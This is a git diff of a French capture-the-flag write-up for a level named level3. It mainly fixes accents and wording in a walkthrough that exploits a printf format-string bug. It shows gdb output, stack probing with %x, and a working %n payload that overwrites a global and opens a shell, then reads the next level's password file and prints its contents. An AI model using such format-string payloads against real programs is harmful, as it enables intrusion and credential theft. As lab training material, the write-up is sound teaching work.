@@ -1,16 +1,16 @@
 # Level3
 
-On observe un executable a la racine `level3`
+On observe un exécutable à la racine : `level3`
 
-```bash
+```shell
 $ ./level3
 Hello World
 Hello World
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level3 -q
 Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -55,21 +55,21 @@ Dump of assembler code for function v:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level3`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level2`
 
-```bash
+```shell
 $ scp -P 4242 -r level3@192.168.56.102:/home/user/level3/level3 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level3
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
 On remarque que la fonction `v` compare la valeur de `m` a `64`
 
 On regarde de la valeur de `m` juste avant la comparaison
 
-```bash
+```shell
 (gdb) set disassembly-flavor intel
 (gdb) break *v+59
 Breakpoint 1 at 0x80484df
@@ -82,25 +82,25 @@ Breakpoint 1, 0x080484df in v ()
 eax            0x0    0
 ```
 
-On peut aussi remarquer que la fonction `v` fait un appel a `printf` en utilisant notre `input` directement en parametre. Il existe une faille dans printf dans ce cas la. Nous allons verifier tout ca maintenant
+On remarque aussi que la fonction `v` fait appel à `printf` en utilisant notre `input` directement en paramètre. Utiliser `printf` de cette façon expose aux failles de types `Format String`. Nous pouvons le vérifier maintenant :
 
-```bash
+```shell
 $ python -c 'print "AAAA %.8x %.8x %.8x %.8x"' | ./level3
 AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-`%x` nous affiche ici l'adresse dans la stack puis la suivante et ainsi de suite. Nous retombons sur nos `AAAA` avec `41414141`
+Puisque printf est mal utilisé, les `%` de la chaine que nous envoyons sont traités comme des formateurs et printf va chercher à les remplir. En l'absence de valeurs définies, `%x` nous affiche ici le premier block dans la stack puis le suivant et ainsi de suite. Nous retombons sur nos `AAAA` avec `41414141`
 
-l'adresse de `m` est `0x804988c`. Nous allons donc chercher a mettre ca en memoire et a le retrouver grace a `%x`
+L'adresse de `m` est `0x804988c`. Nous pouvons donc la mettre en memoire et la retrouver grace à `%x`
 
-```bash
+```shell
 $ python -c 'print "\x8c\x98\x04\x08 %4$.8x"' | ./level3
 � 0804988c
 ```
 
-Nous allons maintenant utiliser `%n` a la place de `%x` qui nous permet a l'adresse lu (affiche par `%x`) enregistrer le nombre de caratere afficher par printf. Essayons de changer notre `%x` en `%n` et afficher la valeur de `m`
+Nous allons maintenant utiliser `%n` a la place de `%x` qui nous permet non pas d'afficher l'adresse lue mais d'y enregistrer le nombre de caractères affichés par printf. Essayons de changer notre `%x` en `%n` et afficher la valeur de `m`
 
-```bash
+```shell
 (gdb) set disassembly-flavor intel
 (gdb) break *v+59
 Breakpoint 1 at 0x80484df
@@ -113,9 +113,9 @@ Breakpoint 1, 0x080484df in v ()
 eax            0x4   4
 ```
 
-Grace au `%n` du printf nous avons reussit a ecrire le nombre `4` a l'adresse de `m`. Plus qu'a mettre cette valeur a 64
+Grâce au `%n` du printf nous avons réussi a écrire le nombre `4` a l'adresse de `m` . Plus qu'à mettre cette valeur à 64 :
 
-```bash
+```shell
 (gdb) run <<< $(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
 Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"')
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -125,18 +125,13 @@ Breakpoint 1, 0x080484df in v ()
 eax            0x40    64
 ```
 
-plus qu'a essayer
+Et voilà !
 
-```bash
+```shell
 $ (python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Wait what?!
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 Ctrl+D
-
-level3:$ su level4
-Password:
-
-level4:$
 ```
